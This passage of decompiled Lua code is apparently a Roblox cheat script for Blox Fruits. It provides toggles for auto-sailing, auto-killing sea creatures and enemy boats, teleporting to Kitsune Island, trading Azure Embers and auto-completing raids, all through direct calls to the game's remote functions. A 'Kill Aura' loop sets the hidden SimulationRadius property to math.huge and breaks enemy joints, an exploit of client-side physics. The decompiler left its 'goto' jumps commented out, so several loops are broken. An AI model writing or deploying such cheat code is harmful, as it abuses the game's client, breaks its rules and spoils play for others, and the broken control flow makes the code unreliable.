        if _G.SailBoat_Hydra then
            pcall(function()
                local v869 = CheckBoat()
                if not v869 then
                    local v870 = CFrame.new(- 16927.451, 9.086, 433.864)
                    TeleportToTarget(v870)
                    if (v870.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                        replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                    end
					-- goto l6
                end
                if v869 then
                    if plr.Character.Humanoid.Sit == false then
                        local v871 = v869.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                        _tp(v871)
						-- goto l6
                    end
                    while true do
                        if true then
                            wait()
                            if CheckEnemiesBoat() or (CheckPirateGrandBrigade() or CheckTerrorShark()) then
                                _tp(CFrame.new(5433, 150, 290))
                            else
                                _tp(CFrame.new(5433, 35, 290))
                            end
                        end
                        if _G.SailBoat_Hydra == false or plr.Character:WaitForChild("Humanoid").Sit == false then
                            plr.Character.Humanoid.Sit = false
							-- goto l6
                        end
                    end
                else
					-- ::l6::
                    return
                end
            end)
        end
    end
end)
v226.SeaEvent:AddDropdown("Q", {
    ["Title"] = "Choose Boats",
    ["Values"] = vu863,
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p872)
    _G.SelectedBoat = p872
end)
v226.SeaEvent:AddButton({
    ["Title"] = "Buy Boats",
    ["Description"] = "Buy the select boats",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
    end
})
v226.SeaEvent:AddDropdown("Q", {
    ["Title"] = "Choose Sea Level",
    ["Values"] = {
        "Lv 1",
        "Lv 2",
        "Lv 3",
        "Lv 4",
        "Lv 5",
        "Lv 6",
        "Lv Infinite"
    },
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p873)
    _G.DangerSc = p873
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Sail Boat",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p874)
    _G.SailBoats = p874
end)
spawn(function()
    while wait() do
        if _G.SailBoats then
            pcall(function()
                local v875 = CheckBoat()
                if not (v875 or CheckShark() and _G.Shark or (CheckTerrorShark() and _G.TerrorShark or (CheckFishCrew() and _G.MobCrew or (CheckPiranha() and _G.Piranha or (CheckEnemiesBoat() and _G.FishBoat or (CheckSeaBeast() and _G.SeaBeast1 or (_G.PGB and CheckPirateGrandBrigade() or (_G.HCM and CheckHauntedCrew() or _G.Leviathan1 and CheckLeviathan())))))))) then
                    local v876 = CFrame.new(- 16927.451, 9.086, 433.864)
                    TeleportToTarget(v876)
                    if (v876.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                        replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                    end
					-- goto l42
                end
                if v875 and not (CheckShark() and _G.Shark) and not (CheckTerrorShark() and _G.TerrorShark or (CheckFishCrew() and _G.MobCrew or (CheckPiranha() and _G.Piranha or (CheckEnemiesBoat() and _G.FishBoat or (CheckSeaBeast() and _G.SeaBeast1 or (_G.PGB and CheckPirateGrandBrigade() or (_G.HCM and CheckHauntedCrew() or _G.Leviathan1 and CheckLeviathan()))))))) then
                    if plr.Character.Humanoid.Sit == false then
                        local v877 = v875.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                        _tp(v877)
						-- goto l42
                    end
                    if _G.DangerSc ~= "Lv 1" then
                        if _G.DangerSc ~= "Lv 2" then
                            if _G.DangerSc ~= "Lv 3" then
                                if _G.DangerSc ~= "Lv 4" then
                                    if _G.DangerSc ~= "Lv 5" then
                                        if _G.DangerSc ~= "Lv 6" then
                                            if _G.DangerSc == "Lv Infinite" then
                                                CFrameSelectedZone = CFrame.new(- 10000000, 31, 37016.25)
                                            end
                                        else
                                            CFrameSelectedZone = CFrame.new(- 44541.7617, 30.0003204, - 1244.8584)
                                        end
                                    else
                                        CFrameSelectedZone = CFrame.new(- 38887.5547, 30.0004578, - 2162.99023)
                                    end
                                else
                                    CFrameSelectedZone = CFrame.new(- 34054.6875, 30.2187767, - 2560.12012)
                                end
                            else
                                CFrameSelectedZone = CFrame.new(- 31171.957, 30.0001011, - 2256.93774)
                            end
                        else
                            CFrameSelectedZone = CFrame.new(- 26779.5215, 30.0005474, - 822.858032)
                        end
                    else
                        CFrameSelectedZone = CFrame.new(- 21998.375, 30.0006084, - 682.309143)
                    end
                    while true do
                        if true then
                            wait()
                            if (_G.FishBoat or not CheckEnemiesBoat()) and ((_G.PGB or not CheckPirateGrandBrigade()) and (_G.TerrorShark or not CheckTerrorShark())) then
                                _tp(CFrameSelectedZone)
                            else
                                _tp(CFrameSelectedZone * CFrame.new(0, 150, 0))
                            end
                        end
                        if _G.SailBoats == false or CheckShark() and _G.Shark or (CheckTerrorShark() and _G.TerrorShark or (CheckFishCrew() and _G.MobCrew or (CheckPiranha() and _G.Piranha or (CheckSeaBeast() and _G.SeaBeast1 or (CheckEnemiesBoat() and _G.FishBoat or (_G.Leviathan1 and CheckLeviathan() or (_G.HCM and CheckHauntedCrew() or _G.PGB and CheckPirateGrandBrigade()))))))) or plr.Character:WaitForChild("Humanoid").Sit == false then
                            plr.Character.Humanoid.Sit = false
							-- goto l42
                        end
                    end
                else
					-- ::l42::
                    return
                end
            end)
        end
    end
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            local v878, v879, v880 = pairs(workspace.Boats:GetChildren())
            while true do
                local v881
                v880, v881 = v878(v879, v880)
                if v880 == nil then
                    break
                end
                local v882, v883, v884 = pairs(workspace.Boats[v881.Name]:GetDescendants())
                while true do
                    local v885
                    v884, v885 = v882(v883, v884)
                    if v884 == nil then
                        break
                    end
                    if v885:IsA("BasePart") then
                        if _G.SailBoats or (_G.Prehis_Find or (_G.FindMirage or (_G.SailBoat_Hydra or _G.AutofindKitIs))) then
                            v885.CanCollide = false
                        else
                            v885.CanCollide = true
                        end
                    end
                end
            end
        end)
    end
end)
v226.SeaEvent:AddSection("Entity Sea Event")
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Shark",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p886)
    _G.Shark = p886
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Piranha",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p887)
    _G.Piranha = p887
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Terror Shark",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p888)
    _G.TerrorShark = p888
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Fish Crew Member",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p889)
    _G.MobCrew = p889
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Haunted Crew Member",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p890)
    _G.HCM = p890
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Attack PirateGrandBrigade",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p891)
    _G.PGB = p891
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Attack Fish Boat",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p892)
    _G.FishBoat = p892
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Attack Sea Beast",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p893)
    _G.SeaBeast1 = p893
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Attack Leviathan",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p894)
    _G.Leviathan1 = p894
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu28
			-- block 197
            if _G.Shark then
                local v895 = {
                    "Shark"
                }
                if CheckShark() then
                    local v896, v897, v898 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v899, v900 = v896(v897, v898)
                        if v899 == nil then
                            break
                        end
                        v898 = v899
                        if table.find(v895, v900.Name) and vu28.Alive(v900) then
                            repeat
                                task.wait()
                                vu28.Kill(v900, _G.Shark)
                            until _G.Shark == false or (not v900.Parent or v900.Humanoid.Health <= 0)
                        end
                    end
                end
            end
            if _G.TerrorShark then
                local v901 = {
                    "Terrorshark"
                }
                if CheckTerrorShark() then
                    local v902, v903, v904 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v905, v906 = v902(v903, v904)
                        if v905 == nil then
                            break
                        end
                        v904 = v905
                        if table.find(v901, v906.Name) and vu28.Alive(v906) then
                            repeat
                                task.wait()
                                vu28.KillSea(v906, _G.TerrorShark)
                            until _G.TerrorShark == false or (not v906.Parent or v906.Humanoid.Health <= 0)
                        end
                    end
                end
            end
            if _G.Piranha then
                local v907 = {
                    "Piranha"
                }
                if CheckPiranha() then
                    local v908, v909, v910 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v911, v912 = v908(v909, v910)
                        if v911 == nil then
                            break
                        end
                        v910 = v911
                        if table.find(v907, v912.Name) and vu28.Alive(v912) then
                            repeat
                                task.wait()
                                vu28.Kill(v912, _G.Piranha)
                            until _G.Piranha == false or (not v912.Parent or v912.Humanoid.Health <= 0)
                        end
                    end
                end
            end
            if _G.MobCrew then
                local v913 = {
                    "Fish Crew Member"
                }
                if CheckFishCrew() then
                    local v914, v915, v916 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v917, v918 = v914(v915, v916)
                        if v917 == nil then
                            break
                        end
                        v916 = v917
                        if table.find(v913, v918.Name) and vu28.Alive(v918) then
                            repeat
                                task.wait()
                                vu28.Kill(v918, _G.MobCrew)
                            until _G.MobCrew == false or (not v918.Parent or v918.Humanoid.Health <= 0)
                        end
                    end
                end
            end
            if _G.HCM then
                local v919 = {
                    "Haunted Crew Member"
                }
                if CheckHauntedCrew() then
                    local v920, v921, v922 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v923, v924 = v920(v921, v922)
                        if v923 == nil then
                            break
                        end
                        v922 = v923
                        if table.find(v919, v924.Name) and vu28.Alive(v924) then
                            repeat
                                task.wait()
                                vu28.Kill(v924, _G.HCM)
                            until _G.HCM == false or (not v924.Parent or v924.Humanoid.Health <= 0)
                        end
                    end
                end
            end
            if not (_G.SeaBeast1 and workspace.SeaBeasts:FindFirstChild("SeaBeast1")) then
				-- goto l88
            end
            local v925, v926, v927 = pairs(workspace.SeaBeasts:GetChildren())
            while true do
                local vu928
                v927, vu928 = v925(v926, v927)
                if v927 == nil then
					-- goto l88
                end
                if vu928:FindFirstChild("HumanoidRootPart") and (vu928:FindFirstChild("Health") and vu928.Health.Value > 0) then
                    repeat
                        task.wait()
                        spawn(function()
							-- upvalues: (ref) vu928
                            _tp(CFrame.new(vu928.HumanoidRootPart.Position.X, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 200, vu928.HumanoidRootPart.Position.Z))
                        end)
                        if plr:DistanceFromCharacter(vu928.HumanoidRootPart.CFrame.Position) <= 500 then
                            AitSeaSkill_Custom = vu928.HumanoidRootPart.CFrame
                            MousePos = AitSeaSkill_Custom.Position
                            if CheckF() then
                                weaponSc("Blox Fruit")
                                Useskills("Blox Fruit", "Z")
                                Useskills("Blox Fruit", "X")
                                Useskills("Blox Fruit", "C")
                            else
                                Useskills("Melee", "Z")
                                Useskills("Melee", "X")
                                Useskills("Melee", "C")
                                wait(0.1)
                                Useskills("Sword", "Z")
                                Useskills("Sword", "X")
                                wait(0.1)
                                Useskills("Blox Fruit", "Z")
                                Useskills("Blox Fruit", "X")
                                Useskills("Blox Fruit", "C")
                                wait(0.1)
                                Useskills("Gun", "Z")
                                Useskills("Gun", "X")
                            end
                        end
                    until _G.SeaBeast1 == false or (not vu928:FindFirstChild("HumanoidRootPart") or (not vu928.Parent or vu928.Health.Value <= 0))
                end
            end
			-- ::l88::
            if not (_G.Leviathan1 and workspace.SeaBeasts:FindFirstChild("Leviathan")) then
				-- goto l116
            end
            local v929, v930, v931 = pairs(workspace.SeaBeasts:GetChildren())
			-- ::l119::
            local vu932
            v931, vu932 = v929(v930, v931)
            if v931 == nil then
				-- goto l116
            end
            if not vu932:FindFirstChild("HumanoidRootPart") or (not vu932:FindFirstChild("Leviathan Segment") or (not vu932:FindFirstChild("Health") or vu932.Health.Value <= 0)) then
				-- goto l119
            end
			-- ::l129::
            task.wait()
            spawn(function()
				-- upvalues: (ref) vu932
                _tp(CFrame.new(vu932.HumanoidRootPart.Position.X, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 200, vu932.HumanoidRootPart.Position.Z))
            end)
            if plr:DistanceFromCharacter(vu932.HumanoidRootPart.CFrame.Position) <= 500 then
                local v933 = vu932
                MousePos = vu932.FindFirstChild(v933, "Leviathan Segment").Position
                if CheckF() then
                    weaponSc("Blox Fruit")
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                else
                    Useskills("Melee", "Z")
                    Useskills("Melee", "X")
                    Useskills("Melee", "C")
                    wait(0.1)
                    Useskills("Sword", "Z")
                    Useskills("Sword", "X")
                    wait(0.1)
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                    wait(0.1)
                    Useskills("Gun", "Z")
                    Useskills("Gun", "X")
                end
            end
            if _G.Leviathan1 == false or (not vu932:FindFirstChild("HumanoidRootPart") or (not vu932.Parent or vu932.Health.Value <= 0)) then
				-- goto l118
            else
				-- goto l129
            end
			-- ::l118::
			-- ::l91::
			-- goto l119
			-- ::l116::
            if not (_G.FishBoat and CheckEnemiesBoat()) then
				-- goto l146
            end
            local v934, v935, v936 = pairs(workspace.Enemies:GetChildren())
			-- ::l149::
            local vu937
            v936, vu937 = v934(v935, v936)
            if v936 == nil then
				-- goto l146
            end
            if vu937:FindFirstChild("Health") and (vu937.Health.Value > 0 and vu937:FindFirstChild("VehicleSeat")) then
				-- goto l99
            else
				-- goto l132
            end
			-- ::l99::
			-- ::l157::
            task.wait()
            spawn(function()
				-- upvalues: (ref) vu937
                if vu937.Name == "FishBoat" then
                    _tp(vu937.Engine.CFrame * CFrame.new(0, - 50, - 25))
                end
            end)
            if plr:DistanceFromCharacter(vu937.Engine.CFrame.Position) <= 150 then
                AitSeaSkill_Custom = vu937.Engine.CFrame
                MousePos = AitSeaSkill_Custom.Position
                if CheckF() then
                    weaponSc("Blox Fruit")
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                else
                    Useskills("Melee", "Z")
                    Useskills("Melee", "X")
                    Useskills("Melee", "C")
                    wait(0.1)
                    Useskills("Sword", "Z")
                    Useskills("Sword", "X")
                    wait(0.1)
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                    wait(0.1)
                    Useskills("Gun", "Z")
                    Useskills("Gun", "X")
                end
            end
            if _G.FishBoat == false or (not vu937:FindFirstChild("VehicleSeat") or vu937.Health.Value <= 0) then
				-- goto l149
            else
				-- goto l157
            end
			-- ::l132::
			-- goto l149
			-- ::l146::
            if not (_G.PGB and CheckPirateGrandBrigade()) then
				-- ::l172::
                return
            end
            local v938, v939, v940 = pairs(workspace.Enemies:GetChildren())
			-- ::l175::
            local vu941
            v940, vu941 = v938(v939, v940)
            if v940 == nil then
				-- goto l172
            end
            if not vu941:FindFirstChild("Health") or (vu941.Health.Value <= 0 or not vu941:FindFirstChild("VehicleSeat")) then
				-- goto l175
            end
			-- ::l183::
            task.wait()
            spawn(function()
				-- upvalues: (ref) vu941
                if vu941.Name ~= "PirateBrigade" then
                    if vu941.Name == "PirateGrandBrigade" then
                        _tp(vu941.Engine.CFrame * CFrame.new(0, - 50, - 50))
                    end
                else
                    _tp(vu941.Engine.CFrame * CFrame.new(0, - 30, - 10))
                end
            end)
            if plr:DistanceFromCharacter(vu941.Engine.CFrame.Position) <= 150 then
                AitSeaSkill_Custom = vu941.Engine.CFrame
                MousePos = AitSeaSkill_Custom.Position
                if CheckF() then
                    weaponSc("Blox Fruit")
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                else
                    Useskills("Melee", "Z")
                    Useskills("Melee", "X")
                    Useskills("Melee", "C")
                    wait(0.1)
                    Useskills("Sword", "Z")
                    Useskills("Sword", "X")
                    wait(0.1)
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                    wait(0.1)
                    Useskills("Gun", "Z")
                    Useskills("Gun", "X")
                end
            end
            if _G.PGB == false or (not vu941:FindFirstChild("VehicleSeat") or vu941.Health.Value <= 0) then
				-- goto l92
            else
				-- goto l183
            end
			-- ::l92::
			-- ::l120::
			-- goto l175
        end)
    end
end)
v226.SeaEvent:AddSection("Kitsune Island / Event")
local vu942 = v226.SeaEvent:AddParagraph({
    ["Title"] = " Kitsune Island Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu942
    while wait(0.2) do
        if workspace.Map:FindFirstChild("KitsuneIsland") or workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") then
            vu942:SetDesc(" Kitsune Island : True")
        else
            vu942:SetDesc(" Kitsune Island : False")
        end
    end
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Find Kitsune Island",
    ["Description"] = "turn on for finding & tween kitsune island",
    ["Default"] = false
}):OnChanged(function(p943)
    _G.AutofindKitIs = p943
end)
spawn(function()
    while wait() do
        if _G.AutofindKitIs then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island", true) then
                    _tp(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
					-- ::l9::
                    return
                else
                    local v944 = CheckBoat()
                    if not v944 then
                        local v945 = CFrame.new(- 16927.451, 9.086, 433.864)
                        TeleportToTarget(v945)
                        if (v945.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end
						-- goto l9
                    end
                    if plr.Character.Humanoid.Sit == false then
                        local v946 = v944.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                        _tp(v946)
						-- goto l9
                    end
                    local v947 = CFrame.new(- 10000000, 31, 37016.25)
                    while true do
                        if true then
                            wait()
                            if CheckEnemiesBoat() or (CheckTerrorShark() or CheckPirateGrandBrigade()) then
                                _tp(CFrame.new(- 10000000, 150, 37016.25))
                            else
                                _tp(CFrame.new(- 10000000, 31, 37016.25))
                            end
                        end
                        if not _G.AutofindKitIs or (v947.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 or (workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") or plr.Character.Humanoid.Sit == false) then
                            plr.Character.Humanoid.Sit = false
							-- goto l9
                        end
                    end
                end
            end)
        end
    end
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Teleport to Shrine Actived",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p948)
    _G.tweenShrine = p948
end)
spawn(function()
    while wait(0.1) do
        if _G.tweenShrine then
            pcall(function()
                local v949 = workspace.Map:FindFirstChild("KitsuneIsland") or game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island")
                local v950 = v949:FindFirstChild("ShrineActive")
                if v950 then
                    local v951 = next
                    local v952, v953 = v950:GetDescendants()
                    while true do
                        local v954
                        v953, v954 = v951(v952, v953)
                        if v953 == nil then
                            break
                        end
                        if v954:IsA("BasePart") and v954.Name:find("NeonShrinePart") then
                            replicated.Modules.Net:FindFirstChild("RE/TouchKitsuneStatue"):FireServer()
                            repeat
                                wait()
                                _tp(v954.CFrame * CFrame.new(0, 2, 0))
                            until _G.tweenShrine == false or not v949
                        end
                    end
                else
                    _tp(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
                end
            end)
        end
    end
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Collect Azure Ember",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p955)
    _G.Collect_Ember = p955
end)
spawn(function()
    while wait(0.1) do
        if _G.Collect_Ember then
            pcall(function()
                if workspace:WaitForChild("AttachedAzureEmber") or workspace:WaitForChild("EmberTemplate") then
                    notween(workspace:WaitForChild("EmberTemplate"):FindFirstChild("Part").CFrame)
                else
                    _tp(workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island").CFrame * CFrame.new(0, 500, 0))
                    replicated.Modules.Net["RF/KitsuneStatuePray"]:InvokeServer()
                end
            end)
        end
    end
end)
v226.SeaEvent:AddToggle("Q", {
    ["Title"] = "Auto Trade Azure Ember",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p956)
    _G.Trade_Ember = p956
end)
spawn(function()
    while wait(0.1) do
        if _G.Trade_Ember then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island", true) then
                    replicated.Modules.Net:FindFirstChild("RF/KitsuneStatuePray"):InvokeServer()
                end
            end)
        end
    end
end)
v226.SeaEvent:AddButton({
    ["Title"] = "Trade Items Azure",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Modules.Net:FindFirstChild("RF/KitsuneStatuePray"):InvokeServer()
    end
})
v226.SeaEvent:AddButton({
    ["Title"] = "Talk with kitsune statue",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Modules.Net:FindFirstChild("RE/TouchKitsuneStatue"):FireServer()
    end
})
v226.Raids:AddSection("Dungeon Event / Raiding")
local vu957 = v226.Raids:AddParagraph({
    ["Title"] = " Raiding Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu957
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu957
            if plr.PlayerGui.Main.Timer.Visible ~= true then
                vu957:SetDesc(" Raiding Statud : False")
            else
                vu957:SetDesc(" Raiding Statud : True")
            end
        end)
    end
end)
local vu958 = {
    "Flame",
    "Ice",
    "Quake",
    "Light",
    "Dark",
    "String",
    "Rumble",
    "Magma",
    "Human: Buddha",
    "Sand",
    "Bird: Phoenix",
    "Dough"
}
v226.Raids:AddDropdown("Q", {
    ["Title"] = "Select Chip",
    ["Values"] = vu958,
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p959)
    _G.SelectChip = p959
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Auto Select Dungeon Chip",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p960)
    _G.AutoSelectDungeon = p960
end)
spawn(function()
    while wait(Sec) do
        if _G.AutoSelectDungeon then
            pcall(function()
                if GetBP("Flame-Flame") then
                    _G.SelectChip = "Flame"
                elseif GetBP("Ice-Ice") then
                    _G.SelectChip = "Ice"
                elseif GetBP("Quake-Quake") then
                    _G.SelectChip = "Quake"
                elseif GetBP("Light-Light") then
                    _G.SelectChip = "Light"
                elseif GetBP("Dark-Dark") then
                    _G.SelectChip = "Dark"
                elseif GetBP("String-String") then
                    _G.SelectChip = "String"
                elseif GetBP("Rumble-Rumble") then
                    _G.SelectChip = "Rumble"
                elseif GetBP("Magma-Magma") then
                    _G.SelectChip = "Magma"
                elseif GetBP("Human-Human: Buddha Fruit") then
                    _G.SelectChip = "Human: Buddha"
                elseif GetBP("Dough-Dough") then
                    _G.SelectChip = "Dough"
                elseif GetBP("Sand-Sand") then
                    _G.SelectChip = "Sand"
                elseif GetBP("Bird-Bird: Phoenix") then
                    _G.SelectChip = "Bird: Phoenix"
                else
                    _G.SelectChip = "Ice"
                end
            end)
        end
    end
end)
v226.Raids:AddButton({
    ["Title"] = "Buy Dungeon Chips [Beli]",
    ["Description"] = "",
    ["Callback"] = function()
        if not GetBP("Special Microchip") then
            replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
        end
    end
})
v226.Raids:AddButton({
    ["Title"] = "Buy Dungeon Chips [Devil Fruit]",
    ["Description"] = "Use your lowest fruit in your bag",
    ["Callback"] = function()
		-- upvalues: (ref) vu958
        if not GetBP("Special Microchip") then
            local v961 = next
            local v962, v963 = replicated:WaitForChild("Remotes").CommF_:InvokeServer("GetFruits")
            local v964 = {}
            while true do
                local v965
                v963, v965 = v961(v962, v963)
                if v963 == nil then
                    break
                end
                if v965.Price <= 490000 then
                    table.insert(v964, v965.Name)
                end
            end
            local v966, v967, v968 = pairs(v964)
            while true do
                local v969
                v968, v969 = v966(v967, v968)
                if v968 == nil then
                    break
                end
                local v970, v971, v972 = pairs(vu958)
                while true do
                    local v973
                    v972, v973 = v970(v971, v972)
                    if v972 == nil then
                        break
                    end
                    if not GetBP("Special Microchip") then
                        replicated.Remotes.CommF_:InvokeServer("LoadFruit", tostring(v969))
                        replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", _G.SelectChip)
                    end
                end
            end
        end
    end
})
v226.Raids:AddSection("Raiding Menu")
v226.Raids:AddToggle("Q", {
    ["Title"] = "Auto Start Raid",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p974)
    _G.Auto_StartRaid = p974
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_StartRaid and (plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == false and GetBP("Special Microchip")) then
                if World2 then
                    _tp(CFrame.new(- 6438.73535, 250.645355, - 4501.50684))
                    fireclickdetector(workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                elseif World3 then
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 5097.93164, 316.447021, - 3142.66602, - 0.405007899, - 4.31682743e-8, 0.914313197, - 1.90943332e-8, 1, 3.8755779e-8, - 0.914313197, - 1.76180437e-9, - 0.405007899))
                    fireclickdetector(workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                end
            end
        end)
    end
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Teleport To Lab",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p975)
    _G.TpLab = p975
    while _G.TpLab do
        wait(Sec)
        if _G.TpLab then
            if World2 and _G.TpLab then
                _tp(CFrame.new(- 6438.73535, 250.645355, - 4501.50684))
            elseif World3 and _G.TpLab then
                _tp(CFrame.new(- 5017.40869, 314.844055, - 2823.0127, - 0.925743818, 4.48217499e-8, - 0.378151238, 4.55503146e-9, 1, 1.07377559e-7, 0.378151238, 9.7681621e-8, - 0.925743818))
            end
        end
    end
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Auto Complete Raid [Safety]",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p976)
    _G.Raiding = p976
end)
spawn(function()
	-- upvalues: (ref) vu28
    pcall(function()
		-- upvalues: (ref) vu28
        while wait(Sec) do
            if _G.Raiding then
                if plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible ~= true then
                    NextIs = false
                else
                    local v977, v978, v979 = ipairs({
                        "Island5",
                        "Island 4",
                        "Island 3",
                        "Island 2",
                        "Island 1"
                    })
                    while true do
                        local v980
                        v979, v980 = v977(v978, v979)
                        if v979 == nil then
                            break
                        end
                        if game:GetService("Workspace")._WorldOrigin.Locations:FindFirstChild(v980) then
                            local v981, v982, v983 = pairs(workspace.Enemies:GetChildren())
                            while true do
                                local v984
                                v983, v984 = v981(v982, v983)
                                if v983 == nil then
                                    break
                                end
                                if (v984:FindFirstChild("Humanoid") or v984:FindFirstChild("HumanoidRootPart")) and v984.Humanoid.Health > 0 then
                                    repeat
                                        wait()
                                        vu28.Kill(v984, _G.Raiding)
                                        NextIs = false
                                    until not _G.Raiding or (not v984.Parent or v984.Humanoid.Health <= 0)
                                    NextIs = true
                                end
                            end
                        end
                    end
                end
            else
                NextIs = false
            end
        end
    end)
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Kill Aura",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p985)
    _G.KillH = p985
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.KillH then
            local v986, v987, v988 = pairs(workspace.Enemies:GetChildren())
            while true do
                local vu989
                v988, vu989 = v986(v987, v988)
                if v988 == nil then
                    break
                end
                if vu28.Alive(vu989) then
                    pcall(function()
						-- upvalues: (ref) vu989
                        repeat
                            wait(Sec)
                            sethiddenproperty(plr, "SimulationRadius", math.huge)
                            vu989:BreakJoints()
                            vu989.Humanoid.Health = 0
                            vu989.HumanoidRootPart.CanCollide = false
                        until not _G.KillH or (not vu989.Parent or vu989.Humanoid.Health <= 0)
                    end)
                end
            end
        end
    end
end)
v226.Raids:AddToggle("Q", {
    ["Title"] = "Auto Next Island",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p990)
    NextIs = p990
end)
spawn(function()
    while wait(Sec) do
        if NextIs and plr.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
            if workspace._WorldOrigin.Locations:FindFirstChild("Island 5") then
                _tp(workspace._WorldOrigin.Locations:FindFirstChild("Island 5").CFrame * CFrame.new(0, 50, 100))
            elseif workspace._WorldOrigin.Locations:FindFirstChild("Island 4") then
                _tp(workspace._WorldOrigin.Locations:FindFirstChild("Island 4").CFrame * CFrame.new(0, 50, 100))
            elseif workspace._WorldOrigin.Locations:FindFirstChild("Island 3") then
                _tp(workspace._WorldOrigin.Locations:FindFirstChild("Island 3").CFrame * CFrame.new(0, 50, 100))
            elseif workspace._WorldOrigin.Locations:FindFirstChild("Island 2") then
                _tp(workspace._WorldOrigin.Locations:FindFirstChild("Island 2").CFrame * CFrame.new(0, 50, 100))
            elseif workspace._WorldOrigin.Locations:FindFirstChild("Island 1") then
